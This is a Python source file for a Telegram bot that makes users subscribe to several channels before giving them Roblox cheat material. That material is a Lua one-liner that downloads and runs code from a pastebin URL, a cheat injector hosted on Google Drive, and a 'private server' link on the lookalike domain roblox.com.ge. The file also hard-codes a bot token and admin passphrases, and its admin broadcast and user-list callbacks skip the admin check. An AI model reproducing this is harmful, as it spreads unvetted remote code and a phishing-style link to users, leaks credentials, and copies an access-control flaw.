import telebot
import random
from telebot import types
import sqlite3
import os
import socket
from threading import Thread

TOKEN = os.environ.get("TOKEN", "8793302361:AAHCxbHJ6v_oCyjHqiafsHHaf7Xr1EvkDO8")
ADMIN_ID = 8091608667
ADMIN_SECRET = "larscriptkryyyyyyt"
ADMIN_SECRET2 = "кресло качалка"

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru')")
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone()
    if not exists:
        c.execute("INSERT INTO users (user_id, lang) VALUES (?, 'ru')", (user_id,))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def set_lang(user_id, lang):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_lang(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 'ru'

def get_all_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = [row[0] for row in c.fetchall()]
    conn.close()
    return users

def count_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

init_db()

CHANNELS = [
    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
]

KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]
PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"

LANG = {
    "ru": {
        "lang_select": "Выберите язык / Choose language",
        "start": "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!",
        "check_sub_btn": "🔍 Проверить подписку",
        "check_again_btn": "🔍 Проверить снова",
        "sub_btn": "Подписаться ✅",
        "unsub_btn": "Подписаться ❎",
        "success_check": "✅ Подписка подтверждена!\n\nВыбери что хочешь получить:",
        "not_all_subs": "❌ Осталось подписаться:",
        "script_btn": "📜 Скрипт на все игры",
        "key_btn": "🔑 Ключ",
        "private_btn": "🔒 Приватный сервер MM2",
        "delta_btn": "📥 Скачать инжектор (Delta)",
        "script_text": "📜 Скрипт на все игры:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Твой ключ:\n\n`{key}`\n\nСкопируй и вставь в скрипт.",
        "private_text": "🔒 Приватный сервер MM2\n\n{link}",
        "not_subscribed": "📢 Подпишитесь на каналы для получения скрипта и ключа",
        "new_user": "🆕 Новый пользователь!\n\n🆔 ID: `{uid}`\n👤 Имя: {name}\n📛 Username: @{uname}\n👥 Всего пользователей: {count}",
        "admin_panel": "🛡 *Админ панель*\n\n👥 Пользователей: {users}\n📊 Каналов: {channels}\n🔑 Ключей: {keys}\n\nВыбери действие:",
        "admin_stats": "📊 *Статистика:*\n👥 Всего пользователей: {users}\n📊 Каналов: {channels}\n🔑 Ключей: {keys}",
        "admin_users_list": "👥 *Пользователи ({count}):*\n\n{list}",
        "admin_no_users": "👥 Пользователей пока нет.",
        "admin_broadcast_prompt": "📨 Введи текст рассылки (получат {count} чел.):",
        "admin_broadcast_done": "✅ Рассылка завершена! Отправлено: {sent}/{total}",
        "admin_stats_btn": "📊 Статистика",
        "admin_users_btn": "👥 Пользователи",
        "admin_broadcast_btn": "📨 Рассылка",
    },
    "en": {
        "lang_select": "Выберите язык / Choose language",
        "start": "😌 To continue using the bot, please complete the following tasks!",
        "check_sub_btn": "🔍 Check subscription",
        "check_again_btn": "🔍 Check again",
        "sub_btn": "Subscribe ✅",
        "unsub_btn": "Subscribe ❎",
        "success_check": "✅ Subscription confirmed!\n\nChoose what you want to get:",
        "not_all_subs": "❌ Still need to subscribe:",
        "script_btn": "📜 Script for all games",
        "key_btn": "🔑 Key",
        "private_btn": "🔒 Private server MM2",
        "delta_btn": "📥 Download Injector (Delta)",
        "script_text": "📜 Script for all games:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Your key:\n\n`{key}`\n\nCopy and paste into the script.",
        "private_text": "🔒 Private server MM2\n\n{link}",
        "not_subscribed": "📢 Subscribe to the channels to get the script and key",
        "new_user": "🆕 New user!\n\n🆔 ID: `{uid}`\n👤 Name: {name}\n📛 Username: @{uname}\n👥 Total users: {count}",
        "admin_panel": "🛡 *Admin Panel*\n\n👥 Users: {users}\n📊 Channels: {channels}\n🔑 Keys: {keys}\n\nChoose action:",
        "admin_stats": "📊 *Stats:*\n👥 Total users: {users}\n📊 Channels: {channels}\n🔑 Keys: {keys}",
        "admin_users_list": "👥 *Users ({count}):*\n\n{list}",
        "admin_no_users": "👥 No users yet.",
        "admin_broadcast_prompt": "📨 Enter broadcast text ({count} users):",
        "admin_broadcast_done": "✅ Broadcast complete! Sent: {sent}/{total}",
        "admin_stats_btn": "📊 Stats",
        "admin_users_btn": "👥 Users",
        "admin_broadcast_btn": "📨 Broadcast",
    }
}

bot = telebot.TeleBot(TOKEN)

def t(user_id, key, **kwargs):
    lang = get_lang(user_id)
    text = LANG.get(lang, LANG["ru"]).get(key, key)
    return text.format(**kwargs) if kwargs else text

def notify_admin(text):
    try:
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_unsubscribed_channels(user_id):
    not_subbed = []
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(f"@{ch['name']}", user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_subbed.append(ch)
        except:
            not_subbed.append(ch)
    return not_subbed

def get_lang_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    )
    return keyboard

def get_channels_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        keyboard.add(types.InlineKeyboardButton(text=f"{t(user_id, 'sub_btn')} {ch['name']}", url=ch['url']))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "check_sub_btn"), callback_data="check_sub"))
    return keyboard

def get_unsub_keyboard(not_subbed, user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in not_subbed:
        keyboard.add(types.InlineKeyboardButton(text=f"{t(user_id, 'unsub_btn')} {ch['name']}", url=ch['url']))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "check_again_btn"), callback_data="check_sub"))
    return keyboard

def get_success_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "script_btn"), callback_data="get_script"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "key_btn"), callback_data="get_key"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "private_btn"), callback_data="get_private"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "delta_btn"), url=DELTA_LINK))
    return keyboard

def get_admin_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(types.InlineKeyboardButton(t(user_id, "admin_stats_btn"), callback_data="admin_stats"))
    keyboard.add(types.InlineKeyboardButton(t(user_id, "admin_users_btn"), callback_data="admin_users_list"))
    keyboard.add(types.InlineKeyboardButton(t(user_id, "admin_broadcast_btn"), callback_data="admin_broadcast"))
    return keyboard

@bot.message_handler(commands=["start"])
def start(message):
    add_user(message.from_user.id)
    bot.send_message(message.chat.id, LANG["ru"]["lang_select"], reply_markup=get_lang_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def lang_callback(call):
    lang = call.data.replace("lang_", "")
    set_lang(call.from_user.id, lang)
    user = call.from_user
    text = t(call.from_user.id, "new_user", uid=user.id, name=user.first_name, uname=user.username or "нет", count=count_users())
    notify_admin(text)
    bot.send_message(call.message.chat.id, t(call.from_user.id, "start"), reply_markup=get_channels_keyboard(call.from_user.id))
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=["getkey"])
def getkey(message):
    add_user(message.from_user.id)
    not_subbed = get_unsubscribed_channels(message.from_user.id)
    if not not_subbed:
        key = random.choice(KEYS)
        bot.send_message(message.chat.id, t(message.from_user.id, "key_text", key=key), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, t(message.from_user.id, "not_subscribed"), reply_markup=get_unsub_keyboard(not_subbed, message.from_user.id))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET)
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    text = t(message.from_user.id, "admin_panel", users=count_users(), channels=len(CHANNELS), keys=len(KEYS))
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_admin_keyboard(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET2)
def broadcast_panel(message):
    if not is_admin(message.from_user.id):
        return
    msg = bot.send_message(message.chat.id, t(message.from_user.id, "admin_broadcast_prompt", count=count_users()))
    bot.register_next_step_handler(msg, broadcast_start)

def broadcast_start(message):
    users = get_all_users()
    text = message.text
    count = 0
    for uid in users:
        try:
            bot.send_message(uid, text)
            count += 1
        except:
            pass
    bot.send_message(message.chat.id, t(message.from_user.id, "admin_broadcast_done", sent=count, total=len(users)))

@bot.callback_query_handler(func=lambda call: call.data in ["check_sub", "get_script", "get_key", "get_private", "admin_stats", "admin_users_list", "admin_broadcast"])
def user_callback(call):
    action = call.data
    user_id = call.from_user.id
    
    if action == "check_sub":
        not_subbed = get_unsubscribed_channels(user_id)
        if not not_subbed:
            bot.send_message(call.message.chat.id, t(user_id, "success_check"), reply_markup=get_success_keyboard(user_id))
        else:
            text = t(user_id, "not_all_subs") + "\n\n"
            for ch in not_subbed:
                text += f"❎ {ch['name']}\n"
            bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed, user_id))
    
    elif action == "get_script":
        bot.send_message(call.message.chat.id, t(user_id, "script_text", script=SCRIPT_LINK), parse_mode="Markdown")
        bot.answer_callback_query(call.id, "✅")
    
    elif action == "get_key":
        key = random.choice(KEYS)
        bot.send_message(call.message.chat.id, t(user_id, "key_text", key=key), parse_mode="Markdown")
        bot.answer_callback_query(call.id, "✅")
    
    elif action == "get_private":
        bot.send_message(call.message.chat.id, t(user_id, "private_text", link=PRIVATE_SERVER_LINK))
        bot.answer_callback_query(call.id, "✅")
    
    elif action == "admin_stats":
        bot.send_message(call.message.chat.id, t(user_id, "admin_stats", users=count_users(), channels=len(CHANNELS), keys=len(KEYS)), parse_mode="Markdown")
        bot.answer_callback_query(call.id)
    
    elif action == "admin_users_list":
        users = get_all_users()
        if not users:
            bot.send_message(call.message.chat.id, t(user_id, "admin_no_users"))
        else:
            text = "\n".join(f"• `{u}`" for u in users[:50])
            if len(users) > 50:
                text += f"\n... и ещё {len(users) - 50}"
            bot.send_message(call.message.chat.id, t(user_id, "admin_users_list", count=len(users), list=text), parse_mode="Markdown")
        bot.answer_callback_query(call.id)
    
    elif action == "admin_broadcast":
        msg = bot.send_message(call.message.chat.id, t(user_id, "admin_broadcast_prompt", count=count_users()))
        bot.register_next_step_handler(msg, broadcast_start)
        bot.answer_callback_query(call.id)

def run_server():
    port = int(os.environ.get("PORT", 10000))
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"Port {port} opened")
    while True:
        c, _ = s.accept()
        c.send(b"HTTP/1.1 200 OK\r\n\r\nBot running")
        c.close()

Thread(target=run_server).start()
bot.polling()
